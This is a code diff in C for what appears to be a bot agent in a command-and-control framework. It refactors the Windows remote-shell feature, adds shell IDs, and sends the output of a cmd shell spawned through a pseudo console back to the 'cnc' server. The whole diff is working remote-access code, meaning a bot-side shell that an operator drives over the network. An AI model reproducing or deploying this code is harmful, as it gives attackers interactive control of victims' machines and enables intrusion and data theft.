@@ -13,7 +13,93 @@ struct sLaika_shell {
     PROCESS_INFORMATION procInfo;
     STARTUPINFOEX startupInfo;
     HPCON pseudoCon;
+    uint32_t id;
 };
+
+HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols, int rows);
+HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo, HPCON hPC);
+
+struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id) {;
+    TCHAR szComspec[MAX_PATH];
+    struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
+    HRESULT hr;
+
+    ZeroMemory(shell, sizeof(struct sLaika_shell));
+    shell->id = id;
+
+    /* create pty */
+    hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
+    if (hr != S_OK) {
+        laikaM_free(shell);
+        return NULL;
+    }
+
+    /* get user's shell path */
+    if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0) {
+        laikaM_free(shell);
+        return NULL;
+    }
+
+    /* create process */
+    hr = InitializeStartupInfoAttachedToPseudoConsole(&shell->startupInfo, shell->pseudoCon);
+    if (hr != S_OK) {
+        ClosePseudoConsole(shell->pseudoCon);
+
+        laikaM_free(shell);
+        return NULL;
+    }
+
+    /* launch cmd shell */
+    hr = CreateProcess(
+        NULL,                           /* No module name - use Command Line */
+        szComspec,                      /* Command Line */
+        NULL,                           /* Process handle not inheritable */
+        NULL,                           /* Thread handle not inheritable */
+        FALSE,                          /* Inherit handles */
+        EXTENDED_STARTUPINFO_PRESENT,   /* Creation flags */
+        NULL,                           /* Use parent's environment block */
+        NULL,                           /* Use parent's starting directory */
+        &shell->startupInfo.StartupInfo,/* Pointer to STARTUPINFO */
+        &shell->procInfo)               /* Pointer to PROCESS_INFORMATION */
+        ? S_OK : HRESULT_FROM_WIN32(GetLastError());
+
+    if (hr != S_OK) {
+        DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
+        laikaM_free(shell->startupInfo.lpAttributeList);
+        
+        ClosePseudoConsole(shell->pseudoCon);
+
+        laikaM_free(shell);
+        return NULL;
+    }
+
+    return shell;
+}
+
+void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+    /* kill process (it's ok if it fails) */
+    TerminateProcess(shell->procInfo.hProcess, 0);
+
+    /* cleanup process - info & thread */
+    CloseHandle(shell->procInfo.hThread);
+    CloseHandle(shell->procInfo.hProcess);
+
+    /* Cleanup attribute list */
+    DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
+    laikaM_free(shell->startupInfo.lpAttributeList);
+
+    /* close pseudo console */
+    ClosePseudoConsole(shell->pseudoCon);
+
+    /* free shell struct */
+    laikaM_free(shell);
+}
+
+uint32_t laikaB_getShellID(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+    return shell->id;
+}
+
+/* ============================================[[ Shell Handlers ]]============================================= */
 
 /* edited from https://github.com/microsoft/terminal/blob/main/samples/ConPTY/EchoCon/EchoCon/EchoCon.cpp */
 HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols, int rows) {
@@ -77,103 +163,17 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
     return hr;
 }
 
-
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {;
-    TCHAR szComspec[MAX_PATH];
-    struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
-    HRESULT hr;
-
-    ZeroMemory(shell, sizeof(struct sLaika_shell));
-
-    /* create pty */
-    hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
-    if (hr != S_OK) {
-        laikaM_free(shell);
-        return NULL;
-    }
-
-    /* get user's shell path */
-    if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0) {
-        laikaM_free(shell);
-        return NULL;
-    }
-
-    /* create process */
-    hr = InitializeStartupInfoAttachedToPseudoConsole(&shell->startupInfo, shell->pseudoCon);
-    if (hr != S_OK) {
-        ClosePseudoConsole(shell->pseudoCon);
-
-        laikaM_free(shell);
-        return NULL;
-    }
-
-    /* launch cmd shell */
-    hr = CreateProcess(
-        NULL,                           /* No module name - use Command Line */
-        szComspec,                      /* Command Line */
-        NULL,                           /* Process handle not inheritable */
-        NULL,                           /* Thread handle not inheritable */
-        FALSE,                          /* Inherit handles */
-        EXTENDED_STARTUPINFO_PRESENT,   /* Creation flags */
-        NULL,                           /* Use parent's environment block */
-        NULL,                           /* Use parent's starting directory */
-        &shell->startupInfo.StartupInfo,/* Pointer to STARTUPINFO */
-        &shell->procInfo)               /* Pointer to PROCESS_INFORMATION */
-        ? S_OK : HRESULT_FROM_WIN32(GetLastError());
-
-    if (hr != S_OK) {
-        DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
-        laikaM_free(shell->startupInfo.lpAttributeList);
-        
-        ClosePseudoConsole(shell->pseudoCon);
-
-        laikaM_free(shell);
-        return NULL;
-    }
-
-    /* start shell task */
-    bot->shellTask = laikaT_newTask(&bot->tService, LAIKA_SHELL_TASK_DELTA, laikaB_shellTask, (void*)bot);
-
-    return shell;
-}
-
-void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
-    /* kill process (it's ok if it fails) */
-    TerminateProcess(shell->procInfo.hProcess, 0);
-
-    /* cleanup process - info & thread */
-    CloseHandle(shell->procInfo.hThread);
-    CloseHandle(shell->procInfo.hProcess);
-
-    /* Cleanup attribute list */
-    DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
-    laikaM_free(shell->startupInfo.lpAttributeList);
-
-    /* close pseudo console */
-    ClosePseudoConsole(shell->pseudoCon);
-
-    /* tell cnc shell is closed */
-    laikaS_emptyOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
-
-    /* free shell struct */
-    laikaM_free(shell);
-    bot->shell = NULL;
-
-    /* stop shell task */
-    laikaT_delTask(&bot->tService, bot->shellTask);
-    bot->shellTask = NULL;
-}
-
 bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
-    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t)];
     struct sLaika_peer* peer = bot->peer;
     struct sLaika_socket* sock = &peer->sock;
     DWORD rd;
-    bool readSucc = ReadFile(shell->in, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH, &rd, NULL);
+    bool readSucc = ReadFile(shell->in, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &rd, NULL);
 
     if (readSucc) {
         /* we read some input! send to cnc */
         laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+        laikaS_writeInt(sock, &shell->id, sizeof(uint32_t));
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else {
